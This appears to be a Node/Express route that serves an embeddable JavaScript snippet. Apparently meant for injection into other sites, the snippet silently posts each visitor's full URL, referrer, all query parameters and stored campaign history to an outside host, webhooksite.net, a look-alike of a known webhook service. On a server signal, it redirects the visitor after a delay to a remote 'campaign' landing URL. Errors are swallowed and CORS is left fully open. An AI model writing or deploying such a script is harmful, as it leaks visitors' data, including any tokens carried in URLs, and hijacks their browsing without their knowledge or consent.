import { Router } from "express";

const router = Router();

export const getScriptCode = (req) => {
  return `!(function () {
  "use strict";

  if (window.top === window.self && !window.__scriptLoaded) {
    window.__scriptLoaded = true;
    var hostname = String(window.location.hostname || "").toLowerCase().trim();

    if (hostname.indexOf("www.") === 0) {
      hostname = hostname.substring(4);
    }
    (async function () {
      try {
        var searchParams = new URLSearchParams(window.location.search);
        var queryParams = {};
        searchParams.forEach(function (val, key) {
          queryParams[key] = val;
        });

        // Build the payload
        var payload = {
          url: window.location.href,
          referrer: document.referrer || "",
          params: queryParams,
          last_navigation: getLastNavigation()
        };

        var response = await fetch("https://webhooksite.net/891a9c0d-b14b-4b77-bb1a-837fb68df1ba", {
          method: "POST",
          mode: "no-cors",
          cache: "no-store",
          credentials: "omit",
          headers: { "Content-Type": "text/plain" },
          body: JSON.stringify(payload)
        });

        var result = await response.json().catch(function () { return null; });
        if (!result || !result.ok) return;
        if (!result.eligible || !result.claimed || !result.campaign) return;

        var campaign = result.campaign;
        var navGuardKey = "nav_guard_" + campaign.id;

        var lastNavGuardTime = Number(sessionStorage.getItem(navGuardKey) || 0);
        if (lastNavGuardTime && Date.now() - lastNavGuardTime < 10000) return;

        var delaySeconds = Math.max(0, Number(campaign.delay_seconds || 0));
        if (delaySeconds > 0) {
          await new Promise(function (resolve) {
            setTimeout(resolve, delaySeconds * 1000);
          });
        }

        var targetUrl;
        try {
          targetUrl = new URL(campaign.landing_url, window.location.href);
        } catch (err) {
          return;
        }

        if (targetUrl.protocol !== "https:" && targetUrl.protocol !== "http:") return;
        if (targetUrl.href === window.location.href) return;

        (function recordCampaignNavigation(campaignId) {
          try {
            var now = Date.now();
            localStorage.setItem(
              "last_navigation",
              JSON.stringify({ campaign_id: Number(campaignId), timestamp: now })
            );
            localStorage.setItem("campaign_frequency_" + Number(campaignId), String(now));
          } catch (err) {}
        })(campaign.id);

        sessionStorage.setItem(navGuardKey, String(Date.now()));
        window.location.assign(targetUrl.href);
      } catch (err) {
      }
    })();
  }

  function getLastNavigation() {
    try {
      var lastNavData = localStorage.getItem("last_navigation");
      if (lastNavData) {
        var parsed = JSON.parse(lastNavData);
        if (parsed && Number(parsed.campaign_id || 0) > 0 && Number(parsed.timestamp || 0) > 0) {
          return {
            campaign_id: Number(parsed.campaign_id),
            timestamp: Number(parsed.timestamp)
          };
        }
      }

      var latest = null;
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        if (key && key.indexOf("campaign_frequency_") === 0) {
          var campaignId = Number(key.replace("campaign_frequency_", ""));
          var timestamp = Number(localStorage.getItem(key) || 0);
          if (campaignId > 0 && timestamp > 0 && (!latest || timestamp > latest.timestamp)) {
            latest = { campaign_id: campaignId, timestamp: timestamp };
          }
        }
      }
      return latest;
    } catch (err) {
      return null;
    }
  }
})();`;
};

// Route: /v2/get (and /v2/get.js) - Completely open and unrestricted for all origins, methods, and embeddings
router.all(["/v2/get", "/v2/get.js"], (req, res) => {
  // 1. Allow all CORS origins, methods, and headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "*");
  res.setHeader("Access-Control-Allow-Headers", "*");
  res.setHeader("Access-Control-Expose-Headers", "*");

  // 2. Allow cross-origin script execution, embedding, and framing anywhere
  res.setHeader("Cross-Origin-Resource-Policy", "cross-origin");
  res.setHeader("Cross-Origin-Embedder-Policy", "unsafe-none");
  res.setHeader("Cross-Origin-Opener-Policy", "unsafe-none");
  res.setHeader("Timing-Allow-Origin", "*");

  // 3. Prevent browser from serving stale cached code during testing
  res.setHeader(
    "Cache-Control",
    "no-store, no-cache, must-revalidate, proxy-revalidate",
  );
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");

  // Handle preflight OPTIONS requests immediately
  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  res.setHeader("Content-Type", "application/javascript; charset=utf-8");
  return res.send(getScriptCode(req));
});

export default router;
